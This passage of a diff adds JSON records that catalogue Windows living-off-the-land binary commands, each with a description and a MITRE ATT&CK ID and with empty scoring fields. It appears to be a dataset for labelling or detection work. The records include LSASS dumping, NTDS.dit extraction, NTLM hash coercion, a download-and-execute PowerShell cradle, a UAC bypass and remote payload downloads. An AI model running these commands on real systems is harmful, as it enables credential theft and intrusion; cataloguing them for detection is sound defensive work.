+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.010",
+        "Shell": null
+    },
+    {
+        "ID": 87,
+        "Command": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A",
+        "Description": "Copy .cab file to destination Used to replace file with another file",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 88,
+        "Command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM",
+        "Description": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. Used to verify rpc connection",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003",
+        "Shell": null
+    },
+    {
+        "ID": 89,
+        "Command": "rundll32.exe {PATH},EntryPoint",
+        "Description": "First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute. Used by Windows to execute dll files",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 90,
+        "Command": "runexehelper.exe {PATH_ABSOLUTE:.exe}",
+        "Description": "Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable. Launcher process",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 91,
+        "Command": "Runonce.exe /AlternateShellStartup",
+        "Description": "Executes a Run Once Task that has been configured in the registry. Executes a Run Once Task that has been configured in the registry",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 92,
+        "Command": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}",
+        "Description": "Execute the PowerShell script with .txt extension Execute target PowerShell script",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 93,
+        "Command": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice",
+        "Description": "Creates a new service and executes the file stored in the ADS. Used by Windows to manage services",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 94,
+        "Command": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"",
+        "Description": "Create a recurring task to execute every minute. Schedule periodic tasks",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1053.005",
+        "Shell": null
+    },
+    {
+        "ID": 95,
+        "Command": "Scriptrunner.exe -appvscript {PATH:.exe}",
+        "Description": "Executes executable Execute binary through proxy binary to evade defensive counter measures",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 96,
+        "Command": "setres.exe -w 800 -h 600",
+        "Description": "Sets the resolution and then launches 'choice' command from the working directory. Configures display settings",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 97,
+        "Command": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}",
+        "Description": "Execute file specified in %COMSPEC% Host Process for Setting Synchronization",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 98,
+        "Command": "ssh localhost \"{CMD}\"",
+        "Description": "Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines. Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 99,
+        "Command": "stordiag.exe",
+        "Description": "Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it. Storage diagnostic tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 100,
+        "Command": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"",
+        "Description": "Example command on how inject Powershell code into the process Used by App-v to get App-v server lists",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 101,
+        "Command": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}",
+        "Description": "Compress one or more files to an alternate data stream (ADS). Used by Windows to extract and create archives.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 102,
+        "Command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"",
+        "Description": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated. Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 103,
+        "Command": "tttracer.exe {PATH_ABSOLUTE:.exe}",
+        "Description": "Execute specified executable from tttracer.exe. Requires administrator privileges. Used by Windows 1809 and newer to Debug Time Travel",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 104,
+        "Command": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\"",
+        "Description": "Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'. Microsoft Windows Media Player Setup Utility",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 105,
+        "Command": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}",
+        "Description": "Binary file used by .NET to compile Visual Basic code to an executable. Binary file used for compile vbs code",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 106,
+        "Command": "verclsid.exe /S /C {CLSID}",
+        "Description": "Used to verify a COM object before it is instantiated by Windows Explorer Used to verify a COM object before it is instantiated by Windows Explorer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.012",
+        "Shell": null
+    },
+    {
+        "ID": 107,
+        "Command": "wab.exe",
+        "Description": "Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice Windows address book manager",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 108,
+        "Command": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
+        "Description": "Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx) Windows Backup Administration utility",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.003",
+        "Shell": null
+    },
+    {
+        "ID": 109,
+        "Command": "winget.exe install --manifest {PATH:.yml}",
+        "Description": "Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles` Windows Package Manager tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 110,
+        "Command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}",
+        "Description": "Execute executable with wlrmdr.exe as parent process Windows Logon Reminder executable",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 111,
+        "Command": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"",
+        "Description": "Execute a .EXE file stored as an Alternate Data Stream (ADS) The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 112,
+        "Command": "WorkFolders",
+        "Description": "Execute control.exe in the current working directory Work Folders",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 113,
+        "Command": "wscript //e:vbscript {PATH}:script.vbs",
+        "Description": "Execute script stored in an alternate data stream Used by Windows to execute scripts",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 114,
+        "Command": "wsreset.exe",
+        "Description": "During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user. Used to reset Windows Store settings according to its manifest file",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1548.002",
+        "Shell": null
+    },
+    {
+        "ID": 115,
+        "Command": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer",
+        "Description": "Loads and executes DLL code on attach. Windows Update Client",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 116,
+        "Command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}",
+        "Description": "Xwizard.exe running a custom class that has been added to the registry. Execute custom class that has been added to the registry or download a file with Xwizard.exe",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 117,
+        "Command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}",
+        "Description": "msedge_proxy will download malicious file. Microsoft Edge Browser",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 118,
+        "Command": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"",
+        "Description": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess. msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.015",
+        "Shell": null
+    },
+    {
+        "ID": 119,
+        "Command": "wt.exe {CMD}",
+        "Description": "Execute a command via Windows Terminal. Windows Terminal",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 120,
+        "Command": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",
+        "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Utility for installing software and drivers with rundll32.exe",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 121,
+        "Command": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",
+        "Description": "Launch an executable with a .scr extension by calling the InstallScreenSaver function. Desktop Settings Control Panel",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 122,
+        "Command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
+        "Description": "Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host) ClickOnce engine in Windows used by .NET",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 123,
+        "Command": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",
+        "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 124,
+        "Command": "rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",
+        "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL. Internet Browser DLL for translating HTML code.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 125,
+        "Command": "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",
+        "Description": "Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box). Microsoft HTML Viewer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 126,
+        "Command": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",
+        "Description": "Launch executable by calling the LaunchApplication function. Microsoft HTML Viewer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 127,
+        "Command": "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",
+        "Description": "Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache. Windows Script Component Runtime",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 128,
+        "Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+        "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Windows Setup Application Programming Interface",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 129,
+        "Command": "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",
+        "Description": "Launch an executable payload via proxy through a URL (information) file by calling OpenURL. Shell Doc Object and Control Library.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 130,
+        "Command": "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",
+        "Description": "Launch a DLL payload by calling the Control_RunDLL function. Windows Shell Common Dll",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 131,
+        "Command": "rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",
+        "Description": "Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'. Photo Gallery Viewer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 132,
+        "Command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+        "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Windows NT System Setup",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 133,
+        "Command": "rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",
+        "Description": "Launch a HTML application payload by calling OpenURL. Internet Shortcut Shell Extension DLL.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 134,
+        "Command": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",
+        "Description": "Launch an executable payload by calling RouteTheCall. Compressed Folder library",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.011",
+        "Shell": null
+    },
+    {
+        "ID": 135,
+        "Command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full",
+        "Description": "Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump. COM+ Services",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.001",
+        "Shell": null
+    },
+    {
+        "ID": 136,
+        "Command": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
+        "Description": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name. Verifies UI accessibility requirements",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 137,
+        "Command": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet",
+        "Description": "Creates a memory dump of the lsass process Debugging tool included with Windows Debugging Tools",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.001",
+        "Shell": null
+    },
+    {
+        "ID": 138,
+        "Command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1",
+        "Description": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument Intune Management Extension included on Intune Managed Devices",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 139,
+        "Command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}",
+        "Description": "Execute an executable file via the Windows App Certification Kit command-line tool. Windows App Certification Kit command-line tool.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 140,
+        "Command": "AppVLP.exe {PATH_SMB:.bat}",
+        "Description": "Executes .bat file through AppVLP.exe Application Virtualization Utility Included with Microsoft Office 2016",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 141,
+        "Command": "bginfo.exe {PATH:.bgi} /popup /nolicprompt",
+        "Description": "Execute VBscript code that is referenced within the specified .bgi file. Background Information Utility included with SysInternals Suite",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 142,
+        "Command": "cdb.exe -cf {PATH:.wds} -o notepad.exe",
+        "Description": "Launch 64-bit shellcode from the specified .wds file using cdb.exe. Debugging tool included with Windows Debugging Tools.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 143,
+        "Command": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name",
+        "Description": "Loads the target .DLL in arbitrary path specified with /L. Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1055",
+        "Shell": null
+    },
+    {
+        "ID": 144,
+        "Command": "createdump.exe -n -f {PATH:.dmp} {PID}",
+        "Description": "Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process. Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003",
+        "Shell": null
+    },
+    {
+        "ID": 145,
+        "Command": "csi.exe {PATH:.cs}",
+        "Description": "Use csi.exe to run unsigned C# code. Command line interface included with Visual Studio.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 146,
+        "Command": "DefaultPack.EXE /C:\"{CMD}\"",
+        "Description": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support. This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 147,
+        "Command": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}",
+        "Description": "Downloads an MSI file to C:\\Windows\\Installer and then installs it. Visual Studio 2019 tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.007",
+        "Shell": null
+    },
+    {
+        "ID": 148,
+        "Command": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
+        "Description": "The above binary will execute other binary. Binary will execute specified binary. Part of VS/VScode installation.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 149,
+        "Command": "dnx.exe {PATH_ABSOLUTE:folder}",
+        "Description": "Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies) .NET Execution environment file included with .NET.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 150,
+        "Command": "dotnet.exe {PATH:.dll}",
+        "Description": "dotnet.exe will execute any DLL even if applocker is enabled. dotnet.exe comes with .NET Framework",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 151,
+        "Command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"",
+        "Description": "dsdbutil supports VSS snapshot creation Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.003",
+        "Shell": null
+    },
+    {
+        "ID": 152,
+        "Command": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}",
+        "Description": "Copy file from source to destination Microsoft command line utility used to manage SQL Server Integration Services packages.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 153,
+        "Command": "dump64.exe {PID} out.dmp",
+        "Description": "Creates a memory dump of the LSASS process. Memory dump tool that comes with Microsoft Visual Studio",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.001",
+        "Shell": null
+    },
+    {
+        "ID": 154,
+        "Command": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full",
+        "Description": "Creates a memory dump of the lsass process Dump tool part Visual Studio 2022",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.001",
+        "Shell": null
+    },
+    {
+        "ID": 155,
+        "Command": "Dxcap.exe -c {PATH_ABSOLUTE:.exe}",
+        "Description": "Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument. DirectX diagnostics/debugger included with Visual Studio.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 156,
+        "Command": "Excel.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office binary",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 157,
+        "Command": "fsi.exe {PATH:.fsscript}",
+        "Description": "Execute F# code via script file 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1059",
+        "Shell": null
+    },
+    {
+        "ID": 158,
+        "Command": "fsianycpu.exe {PATH:.fsscript}",
+        "Description": "Execute F# code via script file 32/64-bit FSharp (F#) Interpreter included with Visual Studio.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1059",
+        "Shell": null
+    },
+    {
+        "ID": 159,
+        "Command": "Mftrace.exe {PATH:.exe}",
+        "Description": "Launch specified executable as a subprocess of Mftrace.exe. Trace log generation tool for Media Foundation Tools.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 160,
+        "Command": "Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}",
+        "Description": "Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe. Part of the NodeJS Visual Studio tools.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 161,
+        "Command": "MSAccess.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office component",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 162,
+        "Command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"",
+        "Description": "Launch .bat file via msdeploy.exe. Microsoft tool used to deploy Web Applications.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 163,
+        "Command": "MsoHtmEd.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office component",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 164,
+        "Command": "mspub.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Publisher",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 165,
+        "Command": "msxsl.exe {PATH:.xml} {PATH:.xsl}",
+        "Description": "Run COM Scriptlet code within the script.xsl file (local). Command line utility used to perform XSL transformations.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1220",
+        "Shell": null
+    },
+    {
+        "ID": 166,
+        "Command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
+        "Description": "Dump NTDS.dit into folder Command line utility used to export Active Directory.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.003",
+        "Shell": null
+    },
+    {
+        "ID": 167,
+        "Command": "OpenConsole.exe {PATH:.exe}",
+        "Description": "Execute specified process with OpenConsole.exe as parent process Console Window host for Windows Terminal",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 168,
+        "Command": "Powerpnt.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office binary.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 169,
+        "Command": "procdump.exe -md {PATH:.dll} explorer.exe",
+        "Description": "Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created. SysInternals Memory Dump Tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 170,
+        "Command": "ProtocolHandler.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server Microsoft Office binary",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 171,
+        "Command": "rcsi.exe {PATH:.csx}",
+        "Description": "Use embedded C# within the csx script to execute the code. Non-Interactive command line inerface included with Visual Studio.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 172,
+        "Command": "Remote.exe /s {PATH:.exe} anythinghere",
+        "Description": "Spawns specified executable as a child process of remote.exe Debugging tool included with Windows Debugging Tools",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 173,
+        "Command": "sqldumper.exe 464 0 0x0110",
+        "Description": "Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp). Debugging utility included with Microsoft SQL.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003",
+        "Shell": null
+    },
